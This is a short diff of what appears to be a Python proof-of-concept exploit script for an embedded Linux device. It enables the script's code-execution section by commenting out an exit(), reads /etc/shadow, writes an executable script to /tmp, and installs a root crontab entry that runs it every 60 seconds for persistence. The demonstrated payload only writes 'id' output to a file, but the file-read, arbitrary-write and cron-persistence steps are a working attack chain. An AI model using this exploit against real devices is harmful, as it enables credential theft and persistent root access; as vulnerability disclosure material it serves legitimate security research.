@@ -99,11 +99,11 @@ if __name__ == "__main__":
         # Example of read file
         poc.read_file("/etc/shadow")
 
-        exit()
+        #exit()
 
         # Example code execution
         print("Write temp script and apply execution permission")
-        poc.write_file("/tmp/upload.ipk", "#!/bin/bash\nid >> /tmp/powned\n", poc.permission_execution)
+        poc.write_file("/tmp/upload.ipk", "#!/bin/ash\nid >> /tmp/powned\n", poc.permission_execution)
 
         print("Write crontrab for exec script every 60 seconds")
         poc.write_file("/etc/crontabs/root", "* * * * * /tmp/upload.ipk\n", poc.permission_default)
